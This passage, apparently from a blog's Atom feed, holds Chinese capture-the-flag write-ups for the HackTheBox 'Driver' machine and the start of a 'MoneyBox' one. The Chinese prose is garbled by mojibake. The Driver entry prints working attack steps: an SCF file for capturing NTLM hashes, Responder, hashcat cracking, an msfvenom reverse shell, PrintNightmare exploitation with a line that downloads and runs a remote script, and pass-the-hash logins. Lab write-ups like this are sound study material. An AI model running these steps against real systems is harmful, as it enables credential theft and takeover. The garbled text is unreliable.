class="line">**********************************</span><br><span class="line">root@Backdoor:~# </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2022/01/05/HTB-Backdoor/image-20220105130426840.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>HTB-driver</title>
    <link href="https://lunamoore.github.io/2021/11/11/HTB-driver/"/>
    <id>https://lunamoore.github.io/2021/11/11/HTB-driver/</id>
    <published>2021-11-11T06:22:48.000Z</published>
    <updated>2021-11-11T06:54:53.228Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><img src="/2021/11/11/HTB-driver/image-20211110125701582.png" class><a id="more"></a><h2 id="0x01-ä¿¡æ¯æ”¶é›†"><a href="#0x01-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x01.ä¿¡æ¯æ”¶é›†"></a>0x01.ä¿¡æ¯æ”¶é›†</h2><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†80ç«¯å£åŠ134ã€445ç­‰æ•æ„Ÿç«¯å£ï¼Œä¸”-sCå‚æ•°è¿›è¡Œäº†smbå…±äº«æ–‡ä»¶çš„åŒ¿åç™»å…¥ï¼Œä½†æ˜¯è¿™å°æœºå™¨å¹¶æ²¡æœ‰å¼€å¯ï¼</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/driver]</span><br><span class="line">â””â”€# nmap -sC -sV -sT -A 10.10.11.106                                                                                             1 â¨¯</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-09 23:50 EST</span><br><span class="line">Nmap scan report for driver.htb (10.10.11.106)</span><br><span class="line">Host is up (0.63s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT    STATE SERVICE      VERSION</span><br><span class="line">80/tcp  open  http         Microsoft IIS httpd 10.0</span><br><span class="line">| http-auth: </span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Basic realm=MFP Firmware Update Center. Please enter password for admin</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Site doesn&#x27;t have a title (text/html; charset=UTF-8).</span><br><span class="line">135/tcp open  msrpc        Microsoft Windows RPC</span><br><span class="line">445/tcp open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Microsoft Windows 2008|Vista|7|10 (88%)</span><br><span class="line">OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_10</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2008 R2 (88%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (85%), Microsoft Windows 10 1511 - 1607 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: DRIVER; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 6h59m59s</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-11-10T11:51:38</span><br><span class="line">|_  start_date: 2021-11-10T04:56:00</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using proto 1/icmp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   711.49 ms 10.10.16.1</span><br><span class="line">2   711.54 ms driver.htb (10.10.11.106)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 90.21 seconds</span><br></pre></td></tr></table></figure><h2 id="0x02-è®¿é—®80ç«¯å£"><a href="#0x02-è®¿é—®80ç«¯å£" class="headerlink" title="0x02.è®¿é—®80ç«¯å£"></a>0x02.è®¿é—®80ç«¯å£</h2><p><code>åœ¨è®¿é—®80ç«¯å£æ—¶å¯ä»¥å‘ç°éœ€è¦ç™»å…¥æ‰å¯ä»¥è·å–åˆ°èµ„æº</code></p><img src="/2021/11/11/HTB-driver/image-20211110125441140.png" class><p><code>è¿™é‡Œå¼±å£ä»¤admin:adminç™»å…¥æˆåŠŸï¼Œæ‰‹åŠ¨çˆ¬è™«å‘ç°fw_up.phpç›®å½•å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸Šä¼ ã€‚</code></p><img src="/2021/11/11/HTB-driver/image-20211110125623201.png" class><h2 id="0x03-SCF-shell-command-file"><a href="#0x03-SCF-shell-command-file" class="headerlink" title="0x03.SCF(shell command file)"></a>0x03.SCF(shell command file)</h2><p>åœ¨ä¸Šä¼ äº†æ•°å°æ—¶çš„webshellåæˆ‘æ”¾å¼ƒäº†ã€‚ã€‚ã€‚ç›´åˆ°æˆ‘é‡æ–°æ€è€ƒäº†ä¸€ä¸‹ï¼Œå‰é¢æ”¶é›†åˆ°äº†445ç«¯å£åŠwebç•Œé¢æ˜¾ç¤ºçš„<strong>æ–‡ä»¶å…±äº«</strong>å­—çœ¼ï¼Œæˆ‘æ‰¾åˆ°äº†SCFã€‚<span class="exturl" data-url="aHR0cHM6Ly9jbG91ZC50ZW5jZW50LmNvbS9kZXZlbG9wZXIvbmV3cy85NzI2">ä½•ä¸ºSCFæ–‡ä»¶æ”»å‡»<i class="fa fa-external-link-alt"></i></span></p><p><code>åˆ›å»º.scfæ–‡ä»¶ï¼Œæ–‡ä»¶ä½¿ç”¨@å¼€å¤´æ˜¯ä¸ºäº†ä¿æŒæ–‡ä»¶å§‹ç»ˆåœ¨ç¬¬ä¸€ä½ï¼Œæ–¹ä¾¿è¯»å–ã€‚</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/driver]</span><br><span class="line">â””â”€# cat @attack.scf </span><br><span class="line">[Shell]</span><br><span class="line">Command=2</span><br><span class="line">IconFile=\\your-ip\share\random.ico  //è¿™é‡Œç›®å½•éšä¾¿å†™ä¸å­˜åœ¨ä¹Ÿå¯ä»¥ï¼Œç›®çš„å°±æ˜¯è®©ç›®æ ‡æ¥é“¾æ¥æˆ‘ä»è€Œè·å¾—ç›®æ ‡çš„hash</span><br><span class="line">[Taskbar]</span><br><span class="line">Command=ToggleDesktop</span><br></pre></td></tr></table></figure><p><code>è¿è¡ŒResponderæŠ“å–Ntlmv2 hash</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/driver/Responder-master]</span><br><span class="line">â””â”€# python2 Responder.py -wrf --lm -v -I tun0</span><br><span class="line">                                         __</span><br><span class="line">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class="line">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class="line">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class="line">                   |__|</span><br><span class="line"></span><br><span class="line">           NBT-NS, LLMNR &amp; MDNS Responder 2.3</span><br><span class="line"></span><br><span class="line">  Author: Laurent Gaffie (laurent.gaffie@gmail.com)</span><br><span class="line">  To kill this script hit CRTL-C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Poisoners:</span><br><span class="line">    LLMNR                      [ON]</span><br><span class="line">    NBT-NS                     [ON]</span><br><span class="line">    DNS/MDNS                   [ON]</span><br><span class="line"></span><br><span class="line">[+] Servers:</span><br><span class="line">    HTTP server                [ON]</span><br><span class="line">    HTTPS server               [ON]</span><br><span class="line">    WPAD proxy                 [ON]</span><br><span class="line">    SMB server                 [ON]</span><br><span class="line">    Kerberos server            [ON]</span><br><span class="line">    SQL server                 [ON]</span><br><span class="line">    FTP server                 [ON]</span><br><span class="line">    IMAP server                [ON]</span><br><span class="line">    POP3 server                [ON]</span><br><span class="line">    SMTP server                [ON]</span><br><span class="line">    DNS server                 [ON]</span><br><span class="line">    LDAP server                [ON]</span><br><span class="line"></span><br><span class="line">[+] HTTP Options:</span><br><span class="line">    Always serving EXE         [OFF]</span><br><span class="line">    Serving EXE                [OFF]</span><br><span class="line">    Serving HTML               [OFF]</span><br><span class="line">    Upstream Proxy             [OFF]</span><br><span class="line"></span><br><span class="line">[+] Poisoning Options:</span><br><span class="line">    Analyze Mode               [OFF]</span><br><span class="line">    Force WPAD auth            [OFF]</span><br><span class="line">    Force Basic Auth           [OFF]</span><br><span class="line">    Force LM downgrade         [ON]</span><br><span class="line">    Fingerprint hosts          [ON]</span><br><span class="line"></span><br><span class="line">[+] Generic Options:</span><br><span class="line">    Responder NIC              [tun0]</span><br><span class="line">    Responder IP               [10.10.16.2]</span><br><span class="line">    Challenge set              [1122334455667788]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[+] Listening for events...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>ä¸Šä¼ @attack.scfå³å¯æŠ“å–åˆ°Ntlmv2 hashï¼Œå¾—åˆ°ç”¨æˆ·åtony</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tony::DRIVER:1122334455667788:CAB4FB213766B6C2B128BA78CAAA28BD:0101000000000000B380F2FC5FD6D701102734F8919D620700000000020000000000000000000000</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110192405051.png" class><h2 id="0x04-è§£å¯†Ntlmv2-hashå€¼"><a href="#0x04-è§£å¯†Ntlmv2-hashå€¼" class="headerlink" title="0x04.è§£å¯†Ntlmv2 hashå€¼"></a>0x04.è§£å¯†Ntlmv2 hashå€¼</h2><p><code>ä½¿ç”¨hashcatå’Œjohnå‡å¯ä»¥ï¼Œå¾—åˆ°å¯†ç ä¸ºliltony</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootğŸ’€kali)-[~/htb/driver]</span><br><span class="line">â””â”€# cat hash       </span><br><span class="line">tony::DRIVER:1122334455667788:CAB4FB213766B6C2B128BA78CAAA28BD:0101000000000000B380F2FC5FD6D701102734F8919D620700000000020000000000000000000000</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110193702034.png" class><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 hash --wordlist /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110194448934.png" class><h2 id="0x05-æ¼æ´åˆ©ç”¨"><a href="#0x05-æ¼æ´åˆ©ç”¨" class="headerlink" title="0x05.æ¼æ´åˆ©ç”¨"></a>0x05.æ¼æ´åˆ©ç”¨</h2><h3 id="1-msfçš„auxiliary-scanner-winrm-winrm-cmd"><a href="#1-msfçš„auxiliary-scanner-winrm-winrm-cmd" class="headerlink" title="1.msfçš„auxiliary/scanner/winrm/winrm_cmd"></a>1.msfçš„auxiliary/scanner/winrm/winrm_cmd</h3><p><code>ä½¿ç”¨auxiliary/scanner/winrm/winrm_cmdæ¨¡å—æ‰§è¡Œå‘½ä»¤ï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸã€‚</code></p><img src="/2021/11/11/HTB-driver/image-20211110202706070.png" class><h3 id="2-evil-winrm-rbåˆ©ç”¨"><a href="#2-evil-winrm-rbåˆ©ç”¨" class="headerlink" title="2.evil-winrm.rbåˆ©ç”¨"></a>2.evil-winrm.rbåˆ©ç”¨</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./evil-winrm.rb -i 10.10.11.106 -u &quot;tony&quot; -p &quot;liltony&quot;</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110203428500.png" class><p><code>æŸ¥çœ‹user.txt</code></p><img src="/2021/11/11/HTB-driver/image-20211110203602240.png" class><h3 id="3-åå¼¹shell"><a href="#3-åå¼¹shell" class="headerlink" title="3.åå¼¹shell"></a>3.åå¼¹shell</h3><p><code>é¦–å…ˆç”Ÿæˆåé—¨æ–‡ä»¶</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=5555 -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure><p><code>ä¸Šä¼ å¹¶æ‰§è¡Œ</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\tony\Desktop&gt; upload /root/htb/driver/shell.exe</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110210457264.png" class><img src="/2021/11/11/HTB-driver/image-20211110210519502.png" class><p><code>è¿™é‡Œè¿ç§»è¿›ç¨‹å¹¶ææƒï¼Œä½†æ˜¯æ²¡æœ‰æˆåŠŸ</code></p><img src="/2021/11/11/HTB-driver/image-20211110210749918.png" class><h2 id="0x06-CVE-2021-1675ææƒ"><a href="#0x06-CVE-2021-1675ææƒ" class="headerlink" title="0x06.CVE-2021-1675ææƒ"></a>0x06.CVE-2021-1675ææƒ</h2><p><code>ç”±webç«™ç‚¹å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªæ‰“å°æœºç½‘ç«™ï¼Œæ‰€ä»¥æŸ¥çœ‹æœåŠ¡å™¨æ˜¯å¦å¼€å¯äº†print spooleræœåŠ¡</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Service -Name Spooler</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211110212314383.png" class><p>å¯ä»¥çœ‹åˆ°æ‰“å°æœåŠ¡å¼€å¯ï¼Œæ¥ä¸‹æ¥è¿›è¡Œåˆ©ç”¨</p><h3 id="1-ç¬¬ä¸€ç§æ–¹å¼"><a href="#1-ç¬¬ä¸€ç§æ–¹å¼" class="headerlink" title="1.ç¬¬ä¸€ç§æ–¹å¼"></a>1.ç¬¬ä¸€ç§æ–¹å¼</h3><p><strong>CVE-2021-1675.py</strong></p><p><code>é¦–å…ˆé…ç½®smbæœåŠ¡ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®æ–‡ä»¶å…è®¸åŒ¿åè®¿é—®</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[global]</span><br><span class="line">client min protocol = CORE</span><br><span class="line">client max protocol = SMB3</span><br><span class="line">map to guest = Bad User</span><br><span class="line">server role = standalone server</span><br><span class="line">usershare allow guests = yes</span><br><span class="line">idmap config * : backend = tdb</span><br><span class="line">smb ports = 445</span><br><span class="line"></span><br><span class="line">[smb]</span><br><span class="line">comment = Samba</span><br><span class="line">path = /tmp</span><br><span class="line">guest ok = yes</span><br><span class="line">read only = no</span><br><span class="line">browsable = yes</span><br><span class="line">force user = smbuser</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211111132854690.png" class><p><code>ä½¿ç”¨impacketçš„smbserver.pyè„šæœ¬å¼€å¯smbæœåŠ¡</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbserver.py smb /tmp</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211111133336371.png" class><p><code>CSç”Ÿæˆæœ¨é©¬ï¼Œä½¿ç”¨CVE-2021-1675.pyåˆ©ç”¨æµè§ˆæœ¬æœºå…±äº«æ–‡ä»¶ï¼Œéœ€è¦å°†ç”Ÿæˆçš„æœ¨é©¬æ–‡ä»¶æ”¾åˆ°ä¹‹å‰è®¾ç½®çš„å…±äº«ç›®å½•/tmpä¸‹</code></p><img src="/2021/11/11/HTB-driver/image-20211111135212474.png" class><p><code>æ¥ä¸‹æ¥æµè§ˆå…±äº«æ–‡ä»¶driver.dllå³å¯ä¸Šçº¿ã€‚</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 CVE-2021â€“1675.py driver.htb/tony:liltony@10.10.11.106 &#x27;\\10.10.16.5\smb\driver.dll&#x27;</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211111135324817.png" class><img src="/2021/11/11/HTB-driver/image-20211111135358519.png" class><img src="/2021/11/11/HTB-driver/image-20211111135939797.png" class><img src="/2021/11/11/HTB-driver/image-20211111141208240.png" class><p><code>å¾—åˆ°system32æƒé™å°±å¯ä»¥è·å–hashå€¼ï¼Œå¯ä»¥çˆ†ç ´NTLMå€¼å¾—åˆ°æ˜æ–‡å¯†ç ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨win-rmä½¿ç”¨hashè¿›è¡Œç™»å…¥</code></p><p>æˆ‘è¿™é‡Œæ²¡æœ‰ç ´è§£æˆåŠŸï¼</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./evil-winrm.rb -i 10.10.11.106 -u &quot;administrator&quot; -H &quot;d1256cff8b5b5fdb8c327d3b6c3f5017&quot;</span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211111141126839.png" class><h3 id="2-ç¬¬äºŒç§æ–¹å¼"><a href="#2-ç¬¬äºŒç§æ–¹å¼" class="headerlink" title="2.ç¬¬äºŒç§æ–¹å¼"></a>2.ç¬¬äºŒç§æ–¹å¼</h3><p><strong>CVE-2021-1675.ps1</strong></p><p><code>åˆ©ç”¨powershellè„šæœ¬åˆ›å»ºä¸€ä¸ªæ–°çš„ç®¡ç†å‘˜ç”¨æˆ·</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\CVE-2021-1675.ps1</span><br><span class="line">Invoke-Nightmare -NewUser &quot;demo&quot; -NewPassword &quot;demo&quot; </span><br></pre></td></tr></table></figure><img src="/2021/11/11/HTB-driver/image-20211111122811651.png" class><p><code>å¯¼å…¥æ¨¡å—çš„æ—¶å€™å¯ä»¥çœ‹åˆ°powershellè„šæœ¬çš„æ‰§è¡Œæƒé™ä¸ºé»˜è®¤ä¸æ‰§è¡Œä»»ä½•è„šæœ¬ï¼Œæ¥ä¸‹æ¥è¿›è¡Œbypass</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">IEX(new-object net.webclient).downloadstring(&#x27;http://your_ip/CVE-2021-1675.ps1&#x27;)</span><br></pre></td></tr></table></figure><p><code>æˆåŠŸåˆ›å»ºç”¨æˆ·</code></p><img src="/2021/11/11/HTB-driver/image-20211111123953437.png" class><p><code>demo:demoç™»å…¥</code></p><img src="/2021/11/11/HTB-driver/image-20211111125319882.png" class><p><code>å¾—åˆ°root.txt</code></p><img src="/2021/11/11/HTB-driver/image-20211111125655214.png" class>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;0x00-ç®€è¿°&quot;&gt;&lt;a href=&quot;#0x00-ç®€è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç®€è¿°&quot;&gt;&lt;/a&gt;0x00.ç®€è¿°&lt;/h2&gt;&lt;img src=&quot;/2021/11/11/HTB-driver/image-20211110125701582.png&quot; class&gt;</summary>
    
    
    
    <category term="HackTheBox" scheme="https://lunamoore.github.io/categories/HackTheBox/"/>
    
    
    <category term="é¶æœº" scheme="https://lunamoore.github.io/tags/%E9%9D%B6%E6%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MoneyBox</title>
    <link href="https://lunamoore.github.io/2021/10/26/MoneyBox/"/>
    <id>https://lunamoore.github.io/2021/10/26/MoneyBox/</id>
    <published>2021-10-26T09:13:15.000Z</published>
    <updated>2021-10-26T09:16:29.535Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-ç®€è¿°"><a href="#0x00-ç®€è¿°" class="headerlink" title="0x00.ç®€è¿°"></a>0x00.ç®€è¿°</h2><blockquote><p>Difficulty : Easy</p><p>Goal : 3 flags</p><p>ä¸€å°CTFé£é¶æœºã€‚veryveryvery<del>~</del>ez</p></blockquote><a id="more"></a><h2 id="0x01-ä¸»æœºå‘ç°"><a href="#0x01-ä¸»æœºå‘ç°" class="headerlink" title="0x01.ä¸»æœºå‘ç°"></a>0x01.ä¸»æœºå‘ç°</h2><p><code>ç”±äºæ˜¯ä»…ä¸»æœºç½‘ç»œï¼Œæ‰€ä»¥ä½¿ç”¨arpæ‰«æå³å¯å‘ç°ã€‚å¦‚ä¸‹ï¼Œ1æ˜¯ç½‘å…³ï¼Œ100æ˜¯DHCPæœåŠ¡å™¨ï¼Œæ‰€ä»¥103å°±æ˜¯é¶æœºIPåœ°å€ã€‚</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ sudo arp-scan 192.168.56.1/24                                                1 â¨¯</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 08:00:27:43:73:bc, IPv4: 192.168.56.104</span><br><span class="line">WARNING: host part of 192.168.56.1/24 is non-zero</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:0e       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:59:03:27       PCS Systemtechnik GmbH</span><br><span class="line">192.168.56.103  08:00:27:0f:86:5f       PCS Systemtechnik GmbH</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.133 seconds (120.02 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure><h2 id="0x02-ä¿¡æ¯æ”¶é›†"><a href="#0x02-ä¿¡æ¯æ”¶é›†" class="headerlink" title="0x02.ä¿¡æ¯æ”¶é›†"></a>0x02.ä¿¡æ¯æ”¶é›†</h2><p><code>å‘ç°äº†IPåœ°å€ï¼Œæ¥ä¸‹æ¥è¿›è¡Œç«¯å£æ‰«æã€‚</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ sudo nmap -p- 192.168.56.103   </span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-26 02:02 EDT</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.56.103</span><br><span class="line">Host is up (0.00052s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">21/tcp open  ftp</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:0F:86:5F (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 3.12 seconds</span><br></pre></td></tr></table></figure><p><code>å¯ä»¥çœ‹åˆ°å¼€æ”¾äº†21ã€22ã€80ç«¯å£ï¼Œæ¥ä¸‹æ¥è¿›è¡Œbanneræ”¶é›†ï¼ŒæŸ¥çœ‹æ¯ä¸ªç«¯å£å¯¹åº”çš„æœåŠ¡åŠç‰ˆæœ¬ä¿¡æ¯ã€‚</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(kaliã‰¿kali)-[~]</span><br><span class="line">â””â”€$ sudo nmap -sV 192.168.56.103 </span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-26 02:07 EDT</span><br><span class="line">mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers</span><br><span class="line">Nmap scan report for 192.168.56.103</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">Not shown: 997 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">21/tcp open  ftp     vsftpd 3.0.3</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span 